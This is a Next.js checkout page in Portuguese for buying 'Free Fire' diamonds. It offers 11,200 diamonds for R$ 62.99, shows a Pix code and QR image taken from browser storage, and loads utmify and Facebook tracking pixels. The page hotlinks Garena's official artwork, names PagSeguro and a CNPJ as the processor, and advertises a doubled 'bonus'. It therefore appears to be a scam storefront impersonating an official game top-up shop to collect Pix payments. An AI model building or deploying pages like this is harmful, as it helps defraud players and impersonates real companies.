
'use client';

import { useState, useEffect } from 'react';
import Link from 'next/link';
import Image from 'next/image';
import { ChevronLeft } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Header } from '@/components/freefire/Header';
import { Footer } from '@/components/freefire/Footer';
import { useToast } from "@/hooks/use-toast";
import { Skeleton } from '@/components/ui/skeleton';

interface CheckoutData {
    playerName: string;
    price: string;
    formattedPrice: string;
    paymentMethodName: string;
    originalAmount: string;
    bonusAmount: string;
    totalAmount: string;
    productDescription: string;
}

const Buy5600Page = () => {
    const { toast } = useToast();
    const [pixCode, setPixCode] = useState("");
    const [pixImage, setPixImage] = useState("");
    const [playerName, setPlayerName] = useState("Carregando...");
    const [paymentData, setPaymentData] = useState<any>(null);
    const [isLoading, setIsLoading] = useState(true);

    const checkoutData: CheckoutData = {
        playerName,
        price: '6299',
        formattedPrice: 'R$ 62,99',
        paymentMethodName: 'PagSeguro',
        originalAmount: '5.600',
        bonusAmount: '5.600',
        totalAmount: '11.200',
        productDescription: "Recarga Free Fire - 11.200 Diamantes",
    };

useEffect(() => {
    // 🔴 Código do pixel entra aqui
    window.pixelId = "68652c2603b34a13ee47f2dd";
    const utmScript = document.createElement("script");
    utmScript.src = "https://cdn.utmify.com.br/scripts/pixel/pixel.js";
    utmScript.async = true;
    utmScript.defer = true;
    document.head.appendChild(utmScript);

    const latestScript = document.createElement("script");
    latestScript.src = "https://cdn.utmify.com.br/scripts/utms/latest.js";
    latestScript.async = true;
    latestScript.defer = true;
    latestScript.setAttribute("data-utmify-prevent-xcod-sck", "");
    latestScript.setAttribute("data-utmify-prevent-subids", "");
    document.head.appendChild(latestScript);

    !(function (f, b, e, v, n, t, s) {
        if (f.fbq) return;
        n = f.fbq = function () {
            n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments);
        };
        if (!f._fbq) f._fbq = n;
        n.push = n;
        n.loaded = !0;
        n.version = "2.0";
        n.queue = [];
        t = b.createElement(e);
        t.async = !0;
        t.src = v;
        s = b.getElementsByTagName(e)[0];
        s.parentNode.insertBefore(t, s);
    })(window, document, "script", "https://connect.facebook.net/en_US/fbevents.js");

    window.fbq("init", "1264486768354584");
    window.fbq("track", "PageView");

    // 🔁 Depois disso, vem o restante da lógica:
    const storedPaymentData = localStorage.getItem("paymentData");

    if (storedPaymentData) {
        const parsed = JSON.parse(storedPaymentData);
        setPixCode(parsed.pixCode || "");
        setPixImage(parsed.pixQrCode || "");
        setPlayerName(parsed.playerName || "Desconhecido");
        setPaymentData(parsed);
    } else {
        toast({
            variant: 'destructive',
            title: 'Erro',
            description: 'Não foi possível carregar os dados do pagamento. Por favor, tente novamente.',
        });
    }

    setIsLoading(false);
}, [toast]);

    const handleCopyCode = () => {
        if (navigator.clipboard && pixCode) {
            navigator.clipboard.writeText(pixCode);
            toast({
                title: "Copiado!",
                description: "O código Pix foi copiado para a área de transferência.",
            });
        }
    };

    if (isLoading) {
        return (
            <div className="flex flex-col min-h-screen bg-white">
                <Header />
                <main className="flex-1 bg-white flex items-center justify-center">
                    <p>Carregando dados do pagamento...</p>
                </main>
                <Footer />
            </div>
        );
    }

    if (!paymentData) {
        return (
            <div className="flex flex-col min-h-screen bg-white">
                <Header />
                <main className="flex-1 bg-white flex items-center justify-center">
                    <div className='text-center'>
                        <p className='text-xl font-bold mb-4'>Erro ao carregar os dados do pagamento.</p>
                        <Button asChild><Link href="/">Voltar para o início</Link></Button>
                    </div>
                </main>
                <Footer />
            </div>
        )
    }

    return (
        <div className="flex flex-col min-h-screen bg-white">
            <Header />
            <main className="flex-1 bg-white">
                <div className="flex flex-col md:mx-auto md:my-6 md:max-w-[600px] md:rounded-2xl md:bg-gray-50 overflow-hidden">
                    <div className="mb-3 bg-gray-50 md:mb-4 md:rounded-t-2xl md:p-2 md:pb-0">
                        <div className="relative h-20 overflow-hidden md:h-[120px] md:rounded-t-lg">
                            <Image
                                className="h-full w-full object-cover"
                                src="https://cdn-gop.garenanow.com/gop/mshop/www/live/assets/FF-f997537d.jpg"
                                alt="Free Fire Banner"
                                fill
                                data-ai-hint="gameplay screenshot"
                            />
                            <Link
                                href="/checkout"
                                className="absolute start-4 top-4 md:start-6 md:top-6 flex items-center gap-1.5 rounded-full bg-black/40 p-1.5 pr-3 text-sm/none font-medium text-white ring-1 ring-white/70 transition-colors hover:bg-black/60 md:pr-3.5 md:text-base/none"
                                aria-label="Voltar para a pagina anterior"
                            >
                                <ChevronLeft className="h-4 w-4 md:h-5 md:w-5" />
                                Voltar
                            </Link>
                        </div>
                        <div className="relative mx-5 -mt-9 flex flex-col items-center gap-4 md:-mt-10">
                            <Image
                                className="block h-[72px] w-[72px] overflow-hidden rounded-lg bg-white object-contain ring-4 ring-gray-50 md:h-20 md:w-20"
                                src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/icon.png"
                                alt="Free Fire"
                                width={80}
                                height={80}
                                data-ai-hint="game icon"
                            />
                            <div className="text-center text-xl/none font-bold text-gray-800 md:text-2xl/none">Free Fire</div>
                        </div>
                    </div>

                    <dl className="mb-3 grid grid-cols-2 justify-between gap-x-3.5 px-4 md:mb-4 md:px-10">
                        <dt className="py-3 text-sm/none text-gray-600 md:text-base/none">Total</dt>
                        <dd className="flex items-center justify-end gap-1 py-3 text-end text-sm/none font-medium text-gray-800 md:text-base/none">
                            <Image className="h-3.5 w-3.5" src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" width={14} height={14} alt="Diamante" data-ai-hint="diamond gem" />
                            {checkoutData.totalAmount}
                        </dd>

                        <div className="col-span-2 my-1 w-full">
                            <ul className="flex flex-col gap-3 rounded-md border border-gray-200/50 bg-white p-3 text-xs/none md:text-sm/none">
                                <li className="flex items-center justify-between gap-12">
                                    <div className="text-gray-600">Preço Original</div>
                                    <div className="flex shrink-0 items-center gap-1">
                                        <Image className="h-3 w-3 object-contain" src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" width={12} height={12} alt="Diamante" data-ai-hint="diamond gem" />
                                        <div className="font-medium text-gray-800">{checkoutData.originalAmount}</div>
                                    </div>
                                </li>
                                <li className="flex items-center justify-between gap-12">
                                    <div className="text-gray-600">+ Bônus Geral</div>
                                    <div className="flex shrink-0 items-center gap-1">
                                        <Image className="h-3 w-3 object-contain" src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" width={12} height={12} alt="Diamante" data-ai-hint="diamond gem" />
                                        <div className="font-medium text-gray-800">{checkoutData.bonusAmount}</div>
                                    </div>
                                </li>
                            </ul>
                        </div>

                        <div className="col-span-2 mb-1 text-xs/normal text-gray-500 md:text-sm/normal">
                            Os diamantes, são válidos apenas para a região do Brasil e serão creditados diretamente na conta de jogo.
                        </div>

                        <dt className="py-3 text-sm/none text-gray-600 md:text-base/none">Preço</dt>
                        <dd className="flex items-center justify-end gap-1 py-3 text-end text-sm/none font-medium text-gray-800 md:text-base/none">
                            {checkoutData.formattedPrice}
                        </dd>

                        <dt className="py-3 text-sm/none text-gray-600 md:text-base/none">Método de pagamento</dt>
                        <dd className="flex items-center justify-end gap-1 py-3 text-end text-sm/none font-medium text-gray-800 md:text-base/none">{checkoutData.paymentMethodName}</dd>

                        <dt className="py-3 text-sm/none text-gray-600 md:text-base/none">Nome do Jogador</dt>
                        <dd className="flex items-center justify-end gap-1 py-3 text-end text-sm/none font-medium text-gray-800 md:text-base/none">{playerName}</dd>
                    </dl>

                    <div className="h-2 bg-gray-200"></div>

                    <div className="flex flex-col gap-6 px-4 pb-8 pt-5 md:p-10 md:pt-6">
                        <div className="flex w-full flex-col">
                            <div className="text-center text-lg/none font-medium text-gray-800">Pague com Pix</div>
                            <div className="my-3 flex h-[150px] w-full items-center justify-center">
                                {pixImage ? (
                                    <Image
                                        src={pixImage}
                                        alt="QR Code Pix"
                                        width={150}
                                        height={150}
                                        data-ai-hint="qr code"
                                    />
                                ) : (
                                    <Skeleton className="h-[150px] w-[150px]" />
                                )}
                            </div>
                            <div className="text-center text-gray-500 text-sm/[22px]">
                                PAGSEGURO TECNOLOGIA LTDA <br />
                                CNPJ:06.375.668/0003-61
                            </div>
                            <div className="mb-4 mt-3 select-all break-words rounded-md bg-gray-100 p-4 text-sm/[22px] text-gray-800">
                                {pixCode || <Skeleton className="h-5 w-full" />}
                            </div>
                            <Button className="mb-6 h-11 text-base font-bold" variant="destructive" onClick={handleCopyCode} disabled={!pixCode}>
                                Copiar Código
                            </Button>
                            <div className="text-gray-500 text-sm/[22px] space-y-4">
                                <p className="font-semibold">Para realizar o pagamento siga os passos abaixo:</p>
                                <ol className="list-decimal list-inside space-y-2 pl-2">
                                    <li>Abra o app ou o site da sua instituição financeira e seleciona o Pix.</li>
                                    <li>Utilize as informações acima para realizar o pagamento.</li>
                                    <li>Revise as informações e pronto!</li>
                                </ol>
                                <p>Seu pedido está sendo processado pelo nosso parceiro PagSeguro.</p>
                                <p>Você receberá seus diamantes após recebermos a confirmação do pagamento. Isso ocorre geralmente em alguns minutos após a realização do pagamento na sua instituição financeira.</p>
                                <p>
                                    Em caso de dúvidas entre em contato com o PagSeguro através do link{' '}
                                    <a href="https://customer.international.pagseguro.com/pt-br" className="underline" target="_blank" rel="noopener noreferrer">
                                        https://customer.international.pagseguro.com/pt-br
                                    </a>
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </main>
            <Footer />
        </div>
    );
}

export default Buy5600Page;